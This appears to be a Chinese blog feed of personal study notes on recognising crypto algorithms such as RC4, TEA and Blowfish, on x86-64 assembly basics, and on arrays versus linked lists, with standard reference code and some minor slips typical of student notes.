<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">for</span> i <span class="keyword">from</span> <span class="number">0</span> to <span class="number">255</span></span><br><span class="line">    S[i] := i</span><br><span class="line"><span class="keyword">endfor</span></span><br><span class="line">j := <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span>( i=<span class="number">0</span> ; i&lt;<span class="number">256</span> ; i++)</span><br><span class="line">    j := (j + S[i] + key[i mod keylength]) % <span class="number">256</span></span><br><span class="line">    swap values of S[i] <span class="keyword">and</span> S[j]</span><br><span class="line"><span class="keyword">endfor</span></span><br></pre></td></tr></table></figure>

<p>下面 i,j 是两个指针。每收到一个字节，就进行 while 循环。通过一定的算法（(a),(b)）定位 S 盒中的一个元素，并与输入字节异或，得到 k。循环中还改变了 S 盒（©）。如果输入的是<a href="https://zh.wikipedia.org/wiki/%E6%98%8E%E6%96%87">明文</a>，输出的就是<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E6%96%87">密文</a>；如果输入的是密文，输出的就是明文。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">i := <span class="number">0</span></span><br><span class="line">j := <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> GeneratingOutput:</span><br><span class="line">    i := (i + <span class="number">1</span>) mod <span class="number">256</span>   <span class="comment">//a</span></span><br><span class="line">    j := (j + S[i]) mod <span class="number">256</span> <span class="comment">//b</span></span><br><span class="line">    swap values of S[i] <span class="keyword">and</span> S[j]  <span class="comment">//c</span></span><br><span class="line">    k := inputByte ^ S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">    output K</span><br><span class="line"><span class="keyword">endwhile</span></span><br></pre></td></tr></table></figure>

<p>此算法保证每 256 次循环中 S 盒的每个元素至少被交换过一次</p>
<p>RC4其实很难说有特色，但他本身的加密算法很简单，分析起来还比较方便</p>
<p>硬要说特色的话，首先要有加密数组和加密数组，数组必须要有，然后就没有多余操作，进行加解密就好了</p>
<p>关键数字是256（0x100），因为里面存在许多交换操作，都是256次！</p>
<h3 id="2-TEA"><a href="#2-TEA" class="headerlink" title="2.TEA"></a>2.TEA</h3><p>在<a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A0%81%E5%AD%A6">密码学</a>中，<strong>微型加密算法</strong>（Tiny Encryption Algorithm，TEA）是一种易于描述和<a href="https://zh.wikipedia.org/w/index.php?title=%E6%89%A7%E8%A1%8C&action=edit&redlink=1">执行</a>的<a href="https://zh.wikipedia.org/wiki/%E5%A1%8A%E5%AF%86%E7%A2%BC">块密码</a>，通常只需要很少的代码就可实现。</p>
<figure class="highlight v"><table><tr><td class="code"><pre><span class="line">#<span class="keyword">include</span> &lt;stdint<span class="variable">.h</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> encrypt (uint32_t* v, uint32_t* k) &#123;</span><br><span class="line">    uint32_t v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, i;           <span class="comment">/* set up */</span></span><br><span class="line">    uint32_t delta=<span class="number">0</span>x9e3779b9;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    uint32_t k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;                       <span class="comment">/* basic cycle start */</span></span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);  </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> decrypt (uint32_t* v, uint32_t* k) &#123;</span><br><span class="line">    uint32_t v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>xC6EF3720, i;  <span class="comment">/* set up */</span></span><br><span class="line">    uint32_t delta=<span class="number">0</span>x9e3779b9;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    uint32_t k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;                         <span class="comment">/* basic cycle start */</span></span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;                                   </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 Tea 算法中其最主要的识别特征就是 拥有一个 magic number ：0x9e3779b9 。当然，这 Tea 算法也有魔改的</p>
<p>这个算法最大的特点在于，他用到了黄金分割线作为密钥调度常数（9e3779b9h）</p>
<p>有些时候可能这个常熟不是很明显，换成了加加减减的操作，这个需要自己是别的，也不会很复杂</p>
<p>同时也会进行分组操作来方便计算，如果你发现有两块进行了分组，并且其中一块的内存分配是另一块的两倍也可以帮助验证，因为TEA算法中，分组长度为64位，密钥长度为128位</p>
<p>最后一个辅助判断就是常数32了，如果程序中定的循环次数是32次（加密解密循环次数），再结合之前的，八九不离十了</p>
<h3 id="3-BlowFish-用PEID可看到P数组和S-BOX"><a href="#3-BlowFish-用PEID可看到P数组和S-BOX" class="headerlink" title="3.BlowFish(用PEID可看到P数组和S-BOX)"></a>3.BlowFish(用PEID可看到P数组和S-BOX)</h3><p><strong>BlowFish</strong> 每次加密数据为 <strong>64位</strong> （2个int)类型数据大小。八个字节, 密钥采用32-448位</p>
<p>BlowFish是由一个16轮循环的Feistel结构进行加密的。</p>
<p><strong>BlowFish</strong> 算法流程是由两部分组成 分别是<strong>密钥扩展</strong>以及<a href="https://cloud.tencent.com/solution/domesticencryption?from=20065&from_column=20065"><strong>数据加密</strong></a>，在数据加密中是一个16轮循环的Feistel网络。每一轮由一个密钥相关置换和一个密钥与数据相关的替换组成的。</p>
<p>先说一下BlowFish需要的子密钥。</p>
<p>BlowFish在加密或者初始化的过程中会使用两个盒来进行加密</p>
<p>分别是<strong>PBOX</strong> 以及<strong>SBOX</strong></p>
<p>PBOX是 由18个32位的字的子密钥组成的。这些密钥可以通过预计算产生的。</p>
<p>其p[0] &#x3D; 0x243F6A88 P[1] &#x3D; 0X85A308D3 P[2] &#x3D; 0X13198A2E P[3] &#x3D; 0X03707344中PBOX记录的就是<strong>Π</strong>后面的小数位。转换成16进制存储到pBox中</p>
<p>例如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">p[<span class="number">0</span>] = <span class="number">0x243F6A88</span></span><br><span class="line">P[<span class="number">1</span>] = <span class="number">0X85A308D3</span></span><br><span class="line">P[<span class="number">2</span>] = <span class="number">0X13198A2E</span></span><br><span class="line">P[<span class="number">3</span>] = <span class="number">0X03707344</span></span><br></pre></td></tr></table></figure>

<p>Sbox跟PBOX一样也是Π的小数位组成。sBox是4组8*32的数组。 如下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">s_box[<span class="number">4</span>][<span class="number">256</span>] = &#123;&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;&#125;;</span><br></pre></td></tr></table></figure>

<p>pBox与Sbox就是BlowFish算法进行加密的核心置换表</p>
<p>子密钥生成,<strong>也就是要将我们的Key 与 pbox进行 异或</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> N 16</span></span><br><span class="line"><span class="comment">//定义初始化需要用到的加密结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">BLOWFISH_CTX</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">//定义初始化的pbox 以及 sbox 在程序中进行初始化</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> pbox[N + <span class="number">2</span>];  <span class="comment">//总共18</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> sbox[<span class="number">4</span>][<span class="number">256</span>];</span><br><span class="line">&#125;BLOWFISH_CTX,*PBLOWFISH_CTX;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">BlowFishInit</span><span class="params">(BLOWFISH_CTX* blowCtx, <span class="type">unsigned</span> <span class="type">char</span> * key, <span class="type">unsigned</span> <span class="type">int</span> keylen)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//第一步初始化Sbox的值 sbox是预先生成的。在全局区是 ORIG_S 数组</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> Row = <span class="number">0</span>; Row &lt; <span class="number">4</span>; Row++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> Col = <span class="number">0</span>; Col &lt; <span class="number">256</span>; Col++)</span><br><span class="line">        &#123;</span><br><span class="line">            blowCtx-&gt;sbox[Row][Col] = ORIG_S[Row][Col];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    第二步 子密钥生成设置key_Pbox</span></span><br><span class="line"><span class="comment">    设置pbox</span></span><br><span class="line"><span class="comment">    1.循环18轮</span></span><br><span class="line"><span class="comment">    2.每轮都设置ctx.pbox值与data ^</span></span><br><span class="line"><span class="comment">    3.data = *(DWORD*)key[0] key[1]..... </span></span><br><span class="line"><span class="comment">    data其实就是4字节转换的Ascii值</span></span><br><span class="line"><span class="comment">    设key = &quot;IBinary&quot;</span></span><br><span class="line"><span class="comment">    data = &quot;IBin&quot;  类似于 memcpy(&amp;data,&quot;IBin&quot;,4);</span></span><br><span class="line"><span class="comment">    当key不足的时候重新从头开始获取并且补足</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="type">int</span> KeyIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> index = <span class="number">0</span>; index &lt; N + <span class="number">2</span>; index++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> data = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//填充data 将key的字符设置到data当中</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//通过移位设置每个字符</span></span><br><span class="line">            data = (data &lt;&lt; <span class="number">8</span>) | key[KeyIndex];</span><br><span class="line">            KeyIndex++;</span><br><span class="line">            <span class="comment">//如果超出了key长度 那么key要从开始</span></span><br><span class="line">            <span class="keyword">if</span> (KeyIndex &gt;= keylen)</span><br><span class="line">                KeyIndex = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//这是时设置key_pbox的值。 原理就是 pbox ^ data  data就是我们的第二层循环。 就是获取四字节的key值 如果你的key只有四个字节。那么</span></span><br><span class="line">        <span class="comment">//都可以不使用第二层循环了</span></span><br><span class="line">        blowCtx-&gt;pbox[index] = ORIG_P[index] ^ data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    第三步 设置key_pbox 与 key_sbox的值</span></span><br><span class="line"><span class="comment">   	1.对一个64位0 进行加密。加密结果的输出设置到pbox[i]与pbox[i+1]中</span></span><br><span class="line"><span class="comment">   	2.初始化key_pbox之后继续重用Data1与Data2 继续进行加密设置到s_box中</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> Data1 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> Data2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N + <span class="number">2</span>; i+=<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        BlowFish_Encry(blowCtx, &amp;Data1, &amp;Data2);</span><br><span class="line">        blowCtx-&gt;pbox[i] = Data1;</span><br><span class="line">        blowCtx-&gt;pbox[i+<span class="number">1</span>] = Data2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//初始化Sbox</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j += <span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            BlowFish_Encry(blowCtx, &amp;Data1, &amp;Data2);</span><br><span class="line">            blowCtx-&gt;sbox[i][j] = Data1;</span><br><span class="line">            blowCtx-&gt;sbox[i][j + <span class="number">1</span>] = Data2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>(未完待续。。。)</p>
<h3 id="4-IDEA"><a href="#4-IDEA" class="headerlink" title="4.IDEA"></a>4.IDEA</h3><p>IDEA(International Data Encryption Algorithm）<strong>在密码学中属于数据块加密算法（Block Cipher）类</strong>。 IDEA使用长度为128bit的密钥，数据块大小为64bit。 从理论上讲，IDEA属于“强”加密算法，至今还没有出现对该算法的有效攻击算法。</p>
<p>(未完待续)</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>base64</p>
<p>Base64 是一种基于 64 个可打印字符来表示二进制数据的表示方法。转换的时候，将 3 字节的数据，先后放入一个 24 位的缓冲区中，先来的字节占高位。数据不足 3 字节的话，于缓冲器中剩下的比特用 0 补足。每次取出 6 比特（因为 <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/c4becc8d811901597b9807eccff60f0897e3701a" alt="{\displaystyle 2^{6}=64}">），按照其值选择<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code>中的字符作为编码后的输出，直到全部输入数据转换完成。</p>
<p>通常而言 Base64 的识别特征为索引表，当我们能找到 <code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code> 这样索引表，再经过简单的分析基本就能判定是 Base64 编码。</p>
]]></content>
      <categories>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>加密编码</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言简单摘要</title>
    <url>/2023/02/20/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%AE%80%E5%8D%95%E6%91%98%E8%A6%81/</url>
    <content><![CDATA[<h3 id="x86-64位寄存器（16个）"><a href="#x86-64位寄存器（16个）" class="headerlink" title="x86-64位寄存器（16个）"></a>x86-64位寄存器（16个）</h3><p>rax：存放保存函数返回值<br>rbx：被调用者保存<br>rdi rsi rdx rcx 对应第1、2、3、4个参数<br>rsp：栈指针，存放栈帧的栈顶的偏移地址<br>r8 r9对应第5、6个参数</p>
<h3 id="寻址"><a href="#寻址" class="headerlink" title="寻址"></a>寻址</h3><p>立即数寻址$Imm Imm(立即数)<br>寄存器寻址%ra R[ra] (寄存器)<br>绝对寻址Imm M[Imm] (存储器)<br>间接寻址（%ra）M[R[[ra]]</p>
<h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">下面有一点地址或寄存器的值，写出操作数的值</span><br><span class="line">地址          值              寄存器       值</span><br><span class="line">0x100      0xFF             rax        0x100</span><br><span class="line">0x104      0xab             rcx        0x1</span><br><span class="line">0x108      0x13             rdx        0x3</span><br><span class="line">0x10C      0x11</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">操作数  值</span><br><span class="line">rax 0x100(寄存器)</span><br><span class="line">0x104 0xab（绝对寻址）</span><br><span class="line"><span class="variable">$0x108</span> 0x108（立即数寻址）</span><br><span class="line">(%rax) 0xFF（间接寻址）</span><br></pre></td></tr></table></figure>

<h3 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h3><p>两种汇编模式<br>ATT汇编movq movb<br>普通汇编 mov <strong>rax,rbx</strong>&#x3D;mov<strong>q %rbx,%rax</strong> （ATT）：把rbx的值赋给rax</p>
<h4 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h4><p>mov 数据传送指令 将数据从一个位置复制到另一个位置的指令<br>mov 寄存器&#x2F;立即数 操作数用来指向一个执行所要使用源数据的值，放置结果的目的位置，mov 源操作数的值是一个立即数，值存放在内存或者寄存器中 目的操作数一个寄存器或者是一个内存地址。</p>
<p><strong>单位</strong>：1字节 &#x3D; 8bit  1字 &#x3D; 8字节 &#x3D; 64bit</p>
<p><strong>movb 一个字节</strong> (这个字代表双字节的意思，与上边的字不一样)<br><strong>movw 一个字<br>movl 双字（寄存器的高四字节设置成0）<br>movq 四字<br>movabsq I,R  R&lt;-I 传送的是绝对的四字 目的操作数只能是寄存器</strong><br>movl $0x4050,%eax      4bytes   立即数–寄存器<br>movw %bp,%sp           2bytes   寄存器–寄存器<br>movb (%rdi,%rcx),%al   1bytes  内存–寄存器<br>movb $-17,(%rsp)       1bytes   立即数–内存<br>movq %rax,-12(%rbp)    8bytes   寄存器–内存l</p>
<h5 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">movabsq <span class="variable">$0x0011223344556677</span> , %rax = 0011223344556677  </span><br><span class="line">（ rax包含了eax eax包含了ax ax包含了al）</span><br><span class="line">-1的16进制是0xFFFFFFFFFFFFFF,第一步结束后每一步rax的值是多少</span><br><span class="line">movb $-1 ,%al           ， %rax = 00112233445566FF   F = 1111</span><br><span class="line">movw $-1 , %ax          ， %rax = 001122334455FFFF   </span><br><span class="line">movl $-1 , %eax         ， %rax = 00000000FFFFFFFF</span><br><span class="line">movq $-1 ,%rax          ， %rax = FFFFFFFFFFFFFFFF </span><br></pre></td></tr></table></figure>


<h5 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h5><p>把下列汇编代码用c语言表示  （rax一直保存的是返回值）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">decode1:</span><br><span class="line">    movq (%rdi) , %r8</span><br><span class="line">    movq (%rsi) , %rcx</span><br><span class="line">    movq (%rdx) , %rax</span><br><span class="line">    movq %r8    , (%rsi)</span><br><span class="line">    movq %rcx   , (%rdx)</span><br><span class="line">    movq %rax ,   (%rdx)      </span><br><span class="line">    ret </span><br></pre></td></tr></table></figure>
<p>c语言</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">decode1</span><span class="params">(<span class="type">long</span> *xp,<span class="type">long</span> *yp,<span class="type">long</span> *zp)</span>&#123;</span><br><span class="line">     <span class="type">long</span> x = *xp;</span><br><span class="line">     <span class="type">long</span> y = *yp;</span><br><span class="line">     <span class="type">long</span> z = *zp;</span><br><span class="line">     *yp = x;</span><br><span class="line">     *zp = y;</span><br><span class="line">     *xp = z;</span><br><span class="line">     <span class="keyword">return</span> z;</span><br><span class="line"> &#125;    </span><br><span class="line">     </span><br></pre></td></tr></table></figure>
<h4 id="push和pop"><a href="#push和pop" class="headerlink" title="push和pop"></a>push和pop</h4><p>push压入栈 pop弹出栈（pop弹出的值一直是一个最近压入栈的数据且仍在栈中）<br>由于栈是由大到小增长的，所以栈顶永远是地址最低的 %rsp保存着栈顶的元素<br>pushq popq 将四字压入栈中 将四字弹出栈<br>pushq %rbp &#x3D; subq $8,%rsp  movq %rbp,(%rsp)   （rsp地址减8）<br>popq <strong>%rax</strong>  &lt;&#x3D;&#x3D;&gt; movq (%rsp),(<strong>%rax</strong>) addq $8,%rsp （rsp地址加8）<br><strong>pop之后，值不会被删除，除非有一个新的值覆盖了原先的值</strong></p>
<h4 id="算数和逻辑操作"><a href="#算数和逻辑操作" class="headerlink" title="算数和逻辑操作"></a>算数和逻辑操作</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">leaq  --&gt; 加载有效地址 </span><br><span class="line">inc --&gt; 加一 </span><br><span class="line">dec --&gt; 减一 </span><br><span class="line">neg --&gt; 取负 </span><br><span class="line">not --&gt; 取补 </span><br><span class="line">add --&gt; 加 </span><br><span class="line">sub --&gt; 减 </span><br><span class="line">imul --&gt; 乘 </span><br><span class="line">xor --&gt; 异或 </span><br><span class="line">or --&gt; 或 </span><br><span class="line">and --&gt; 与 </span><br><span class="line">sal --&gt; 算数左移 </span><br><span class="line"> sar --&gt; 算数右移 </span><br><span class="line"> shl --&gt;逻辑左移</span><br><span class="line">shr --&gt; 逻辑右移</span><br></pre></td></tr></table></figure>
<h5 id="1-加载地址"><a href="#1-加载地址" class="headerlink" title="1.加载地址"></a>1.加载地址</h5><p>movq的一种变形 从内存读数据到寄存器 但是没有引用内存 不是单纯的读数据，而是将有效地址加载到目的操作数 <strong>描述简单的算数操作</strong></p>
<h6 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h6><p>rdi &#x3D; x<br> leaq 7(%rdi,%rdi,4),%rax &#x3D;&#x3D; 将rax的值设置为5x+7</p>
<h5 id="2-一元操作和二元操作"><a href="#2-一元操作和二元操作" class="headerlink" title="2.一元操作和二元操作"></a>2.一元操作和二元操作</h5><p> 只有一个操作数的是一元操作，既是源操作数也是目的操作数<br>地址          值              寄存器       值<br>0x100      0xFF             rax        0x100<br>0x108      0xAB             rcx        0x1<br> 0x118  0x11           rdx        0x3<br><strong>subq</strong> %rax,%rdx rdx &#x3D; rdx -rax<br><strong>addq</strong> %rcx , (%rax)   ;更新的其实是一个内存位置 位置为0x100<br><strong>imulq</strong> $16,(%rax,%rdx,8) ;更新的内存位置是0x118，值对应的是0x11*16&#x3D;0x110<br>他们的目的和最终值写出来<br>imulq 有符号乘法 一个操作数 这个指令要求就是必须两个数都在寄存器rax中 把高64位存放在rdx，低64位存放在rax里面<br><strong>salq</strong> $4,%rax(左移4位，扩大了2的4次方倍)</p>
<h5 id="控制操作"><a href="#控制操作" class="headerlink" title="控制操作"></a>控制操作</h5><p>t  &#x3D; a + b<br>无符号溢出 <strong>CF</strong> （条件码）<br>  t&#x3D;&#x3D;0 <strong>ZF</strong><br> t &lt; 0  <strong>SF</strong><br> (a&lt;0&amp;&amp;b&lt;0) &amp;&amp; (t&lt;0 !&#x3D; a &lt;0) 有符号溢出 <strong>OF</strong><br><strong>leaq</strong> 不会改变任何条件码 xor 会将进位标志和溢出位标志设置成0<br><strong>cmpb</strong> 比较字节 <strong>cmpw</strong> 比较字  <strong>test</strong> 测试<br><strong>cmp</strong> rsi,rdi<br>cmp根据两个比较数的差来设置条件码 （除了不更新寄存器以外，和sub操作是一样的 test也是除了不更新寄存器以外，和 and 操作是一样的）<br><strong>testq</strong> %rax,%rax 检查rax是负数还是正数还是0<br> set指令设置条件码</p>
]]></content>
      <categories>
        <category>汇编基础笔记</category>
      </categories>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>深入浅出数据结构笔记</title>
    <url>/2023/05/05/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<p><strong>导读</strong></p>
<p>b站上带有咖喱味英语的数据结构课程</p>
<p>概念：Data Structures is a way to store and organize data</p>
<p>数字和逻辑模型数学数学Mathematical&#x2F;logical models( 抽象数据类型Abstract Data Types,简称ADP)</p>
<p>谈论实现(Implementation)</p>
<p> ADTS:Arrays,Linked List,stack,Queue,Tree,Graph…</p>
<h1 id="抽象数据类型-ADTS"><a href="#抽象数据类型-ADTS" class="headerlink" title="抽象数据类型(ADTS)"></a>抽象数据类型(ADTS)</h1><p>先用array定义抽象数据类型</p>
<p>首先定义一个基本的给定元素数量、给定数据类型的静态列表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int A[10];</span><br><span class="line">A[i]=2;</span><br><span class="line">print A[i];</span><br></pre></td></tr></table></figure>

<p>然后再试着定义一个动态列表，特点是列表为空其大小为零，并且可以在列表中插入或者修改元素</p>
<blockquote>
<p>-empty list has   -insert  -remove  -count  -Read&#x2F;modity element at a  position </p>
<p>-Bpecity data-type</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> [MAX SIZE]</span><br><span class="line"><span class="type">int</span> end=<span class="number">-1</span>;<span class="comment">//每次插入数组都会改变，指向空数组</span></span><br><span class="line"><span class="built_in">insert</span>(<span class="number">2</span>)<span class="number">0</span>:<span class="number">2</span></span><br><span class="line"><span class="built_in">insert</span>(<span class="number">4</span>);<span class="number">0</span>:<span class="number">2</span> <span class="number">1</span>:<span class="number">4</span></span><br><span class="line"><span class="built_in">insert</span>(<span class="number">6</span>);<span class="number">0</span>:<span class="number">2</span> <span class="number">1</span>:<span class="number">4</span> <span class="number">2</span>:<span class="number">6</span></span><br><span class="line"><span class="built_in">insert</span>(<span class="number">7</span>);<span class="number">0</span>:<span class="number">2</span> <span class="number">1</span>:<span class="number">4</span> <span class="number">2</span>:<span class="number">6</span> <span class="number">3</span>:<span class="number">7</span></span><br><span class="line"><span class="built_in">isnert</span>(<span class="number">9</span>);<span class="number">0</span>:<span class="number">2</span> <span class="number">1</span>:<span class="number">4</span> <span class="number">2</span>:<span class="number">6</span> <span class="number">3</span>:<span class="number">7</span> <span class="number">4</span>:<span class="number">9</span></span><br><span class="line"><span class="built_in">insert</span>(<span class="number">5</span>,<span class="number">2</span>);<span class="number">0</span>:<span class="number">2</span> <span class="number">1</span>:<span class="number">4</span> <span class="number">2</span>:<span class="number">5</span> <span class="number">3</span>:<span class="number">6</span> <span class="number">4</span>:<span class="number">7</span> <span class="number">5</span>:<span class="number">9</span></span><br><span class="line"><span class="built_in">remove</span>(<span class="number">0</span>);<span class="number">0</span>:<span class="number">4</span> <span class="number">1</span>:<span class="number">5</span> <span class="number">2</span>:<span class="number">6</span> <span class="number">3</span>:<span class="number">7</span> <span class="number">4</span>:<span class="number">9</span></span><br></pre></td></tr></table></figure>

<p>当数组已满，将创建一个新的更大(两倍)的数组，并复制上一个数组的所有元素到新的数组，然后释放上一个数组占用的内存，所以发现用数组试着创建一个动态列表就内存利用率和消耗量而言，不是最有效的，还存在一些限制。为了更好理解链表，我们需要了解这些限制</p>
<p>linked list逻辑理解</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span>                         <span class="comment">//example:6,5,4,2,3</span></span><br><span class="line">    <span class="type">int</span> data;<span class="comment">//4bytes</span></span><br><span class="line">    Node next;<span class="comment">//bytes</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>![](<a href="https://cdn.jsdelivr.net/gh/jangfan/picb@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图</a> 2023-05-06 171244.png)</p>
<p>linked list可以实现list的限制，并且不会占用多余的空间</p>
<p>array VS Linked List</p>
<p>比较方面</p>
<p>1.cost of accesing an element(成本)</p>
<p>2.Memory  requirements(内存需求)</p>
<p>3.cost of iserting anelement(插入元素的成本，时间复杂度)</p>
<p>4.easy of use</p>
<p>Array</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1:constant time O(1)</span><br><span class="line">2：Fixed size(memory may not be available as oe large blocus)</span><br><span class="line">3：</span><br><span class="line">(1)at beginning O(N)</span><br><span class="line">(2)at end o(1)</span><br><span class="line">(3)a ith o(n)</span><br><span class="line">4:y</span><br></pre></td></tr></table></figure>

<p>Linked List</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1:average case O(n)</span><br><span class="line">2:No usused memory  extra memory for pointer variables</span><br><span class="line">(memory may be available as multiple small blocus)</span><br><span class="line">3：</span><br><span class="line">(1)at begining O(1)</span><br><span class="line">(2)at end O(n)  要先全部遍历一遍，所以花费时间和链表元素成正比</span><br><span class="line">(3)at ith O(n)</span><br><span class="line">4:n</span><br></pre></td></tr></table></figure>

<h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><h3 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h3><p><strong>在c&#x2F;c++中实现</strong></p>
<p>逻辑视图如下</p>
<p>![](<a href="https://cdn.jsdelivr.net/gh/jangfan/picb@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图</a> 2023-05-08 095921.png)</p>
